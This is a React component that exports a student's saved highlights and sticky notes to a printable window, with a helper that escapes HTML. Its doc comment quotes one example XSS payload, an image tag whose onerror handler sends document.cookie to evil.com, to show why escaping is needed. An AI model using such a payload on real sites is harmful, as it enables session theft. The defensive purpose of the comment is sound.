import { Download } from 'lucide-react';
import './StudentTools.css';

/**
 * Escapes HTML special characters to prevent XSS when interpolating
 * user-controlled strings into a raw HTML template string.
 *
 * All five dangerous HTML characters are covered:
 *   &  →  &amp;   (must be first to avoid double-escaping)
 *   <  →  &lt;
 *   >  →  &gt;
 *   "  →  &quot;
 *   '  →  &#x27;
 *
 * This is applied to every value read from localStorage before it is
 * embedded into the print window's document — specifically:
 *   - h.text        (highlight text, user-selected page content)
 *   - h.color       (CSS color value — attacker could inject "; expression(…)  " in IE)
 *   - h.colorName   (label string)
 *   - n.content     (sticky note body, fully user-controlled)
 *
 * Without escaping, a highlight of:
 *   <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
 * would execute as script in the print window's same origin.
 */
function escapeHtml(str) {
    if (typeof str !== 'string') return '';
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
}

export default function ExportPDF({ chapterId = 'default', chapterTitle = 'Chapter' }) {
    const handleExport = () => {
        // Gather highlights
        let highlights = [];
        try {
            const saved = localStorage.getItem(`highlights_${chapterId}`);
            if (saved) highlights = JSON.parse(saved);
        } catch { /* ignore */ }

        // Gather sticky notes
        let notes = [];
        try {
            const saved = localStorage.getItem(`stickynotes_${chapterId}`);
            if (saved) notes = JSON.parse(saved);
        } catch { /* ignore */ }

        // Safe title — comes from props (trusted), but escape anyway for defence-in-depth
        const safeTitle = escapeHtml(chapterTitle);

        // Build printable HTML — ALL user-sourced values are escaped before interpolation
        const html = `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>${safeTitle} — Study Notes Export</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', system-ui, sans-serif; padding: 40px; color: #1a1a2e; line-height: 1.6; }
        h1 { font-size: 24px; margin-bottom: 8px; color: #3b82f6; }
        .subtitle { color: #6b7280; font-size: 13px; margin-bottom: 32px; }
        h2 { font-size: 18px; margin: 24px 0 12px; padding-bottom: 6px; border-bottom: 2px solid #e5e7eb; }
        .highlight-item { display: flex; align-items: flex-start; gap: 12px; padding: 10px 0; border-bottom: 1px solid #f3f4f6; }
        .highlight-swatch { width: 16px; height: 16px; border-radius: 4px; flex-shrink: 0; margin-top: 3px; }
        .highlight-text { font-size: 14px; }
        .highlight-meta { font-size: 11px; color: #9ca3af; margin-top: 2px; }
        .note-card { background: #fffbeb; border: 1px solid #fde68a; border-radius: 8px; padding: 12px 16px; margin-bottom: 12px; font-size: 14px; white-space: pre-wrap; }
        .empty { color: #9ca3af; font-style: italic; font-size: 14px; }
        @media print { body { padding: 20px; } }
    </style>
</head>
<body>
    <h1>📒 ${safeTitle}</h1>
    <p class="subtitle">Study Notes Export · ${new Date().toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })}</p>

    <h2>🖍️ Highlights (${highlights.length})</h2>
    ${highlights.length === 0
            ? '<p class="empty">No highlights saved for this chapter.</p>'
            : highlights.map(h => `
        <div class="highlight-item">
            <div class="highlight-swatch" style="background:${escapeHtml(h.color)}"></div>
            <div>
                <div class="highlight-text">&ldquo;${escapeHtml(h.text)}&rdquo;</div>
                <div class="highlight-meta">${escapeHtml(h.colorName)} · ${new Date(h.createdAt).toLocaleString()}</div>
            </div>
        </div>
    `).join('')
        }

    <h2>📝 Sticky Notes (${notes.length})</h2>
    ${notes.length === 0
            ? '<p class="empty">No sticky notes for this chapter.</p>'
            : notes.map(n => `<div class="note-card">${escapeHtml(n.content || '(empty note)')}</div>`).join('')
        }
</body>
</html>`;

        // Open print dialog
        const printWindow = window.open('', '_blank');
        if (!printWindow) return; // popup blocker
        printWindow.document.write(html);
        printWindow.document.close();
        setTimeout(() => {
            printWindow.print();
        }, 300);
    };

    return (
        <button className="btn btn-sm btn-ghost export-pdf-btn" onClick={handleExport}>
            <Download size={14} /> Export PDF
        </button>
    );
}
